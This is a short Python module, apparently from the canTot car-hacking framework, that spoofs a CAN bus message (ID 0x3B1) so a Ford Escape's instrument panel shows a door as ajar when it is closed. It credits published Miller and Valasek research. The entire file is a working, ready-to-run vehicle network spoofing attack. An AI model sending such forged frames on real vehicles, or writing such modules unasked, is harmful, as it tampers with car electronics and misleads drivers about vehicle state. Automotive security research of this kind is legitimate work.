from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class ford_escape_door_ajarSpoof(Module):
    """ This module will indicate that the door is ajar (open) from the instrument panel despite not opened.

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: https://ioactive.com/pdfs/IOActive_Adventures_in_Automotive_Networks_and_Control_Units.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        frame = can.Frame(0x3B1)
        frame.data = [0x80,0,0,0,0,0,0,0]
        print("[*] Spoofing the instrument panel that the door is ajar but not really :)")
        dev.send(frame)
        pass